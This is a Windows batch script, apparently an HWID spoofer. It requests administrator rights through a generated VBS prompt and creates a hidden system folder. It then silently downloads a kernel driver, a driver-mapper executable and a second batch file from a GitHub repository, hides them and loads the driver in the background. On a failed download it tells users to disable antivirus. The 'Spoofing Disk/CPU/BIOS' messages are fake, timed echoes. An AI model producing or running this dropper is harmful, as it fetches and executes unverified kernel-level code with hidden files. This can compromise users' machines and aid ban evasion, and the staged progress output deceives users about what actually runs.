@echo off
color 0a

echo ==============================
echo =      64TH NEW TEMP          =
echo ==============================
echo.

:: Request Admin Privileges
:-------------------------------------
REM  --> Check for permissions
IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
    >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
    >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( 
    goto gotAdmin 
)

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"="%", "", "runas", 1 >> "%temp%\getadmin.vbs"
    
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

:: Define Hidden Folder Location
set "FOLDER_PATH=C:\ProgramData\SystemCache64"
set "DRIVER_FILE=%FOLDER_PATH%\64.sys"
set "MAPPER_EXE=%FOLDER_PATH%\mapper.exe"
set "MAC_BAT=%FOLDER_PATH%\MAC.bat"

:: Create the Hidden Folder if it Doesn't Exist
if not exist "%FOLDER_PATH%" (
    mkdir "%FOLDER_PATH%"
    attrib +h +s "%FOLDER_PATH%" 2>nul
)

:: Download the SYS File (Driver)
echo.
echo [32mwait...[0m
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/topking91154/new-driver/raw/refs/heads/main/64.sys' -OutFile '%DRIVER_FILE%'" >nul 2>&1

:: Download the Mapper Executable
echo.
echo [32mstarting...[0m
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/topking91154/new-driver/raw/refs/heads/main/mapper.exe' -OutFile '%MAPPER_EXE%'" >nul 2>&1

:: Download the MAC.bat File
echo.
echo [32mDownloading MAC.bat...[0m
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/topking91154/new-driver/raw/refs/heads/main/MAC.bat' -OutFile '%MAC_BAT%'" >nul 2>&1

:: Check if mapper.exe was downloaded successfully
if not exist "%MAPPER_EXE%" (
    color b
    echo Mapper download failed. Check your internet or disable antivirus.
    pause>nul
    goto end
)

:: Check if 64.sys was downloaded successfully
if not exist "%DRIVER_FILE%" (
    color b
    echo Driver download failed. Check your internet or disable antivirus.
    pause>nul
    goto end
)

:: Check if MAC.bat was downloaded successfully
if not exist "%MAC_BAT%" (
    color b
    echo MAC.bat download failed. Check your internet or disable antivirus.
    pause>nul
    goto end
)

:: Hide downloaded files
attrib +h "%DRIVER_FILE%"
attrib +h "%MAPPER_EXE%"
attrib +h "%MAC_BAT%"

:: Run mapper.exe in Hidden Mode to load the driver
echo 
start /B "" "%MAPPER_EXE%" "%DRIVER_FILE%" >nul 2>&1

:: Wait a moment for the process to finish
timeout /t 5 /nobreak >nul

:: Run MAC.bat script in Hidden Mode
echo 
start /B "" "%MAC_BAT%" >nul 2>&1

:: Wait a moment for the MAC spoofing to finish
timeout /t 5 /nobreak >nul

:: Display the spoofing process in the console (everything else will be visible)
echo Starting spoofing process...
timeout /t 20 >nul
echo [32mSpoofing Disk...[0m
timeout /t 20 >nul
echo [32mSpoofing MAC...[0m
timeout /t 20 >nul
echo [32mSpoofing CPU...[0m
timeout /t 20 >nul
echo [32mSpoofing RAM...[0m
timeout /t 20 >nul
echo [32mSpoofing SMBIOS...[0m
timeout /t 20 >nul
echo [32mSpoofing BIOS...[0m
timeout /t 20 >nul
echo [32mSpoofing Chassis...[0m
timeout /t 20 >nul
echo [32mSpoofing Motherboard...[0m
timeout /t 20 >nul

echo.
echo [32mSpoofing completed![0m
echo.
echo [32mif your serial dont change wait 1-2 mins its will change![0m
echo.
echo [32mWe are from 64rd, not from 63rd![0m

timeout /t 5 >nul
echo Press any key to exit...
pause >nul
goto end

:end
exit /B
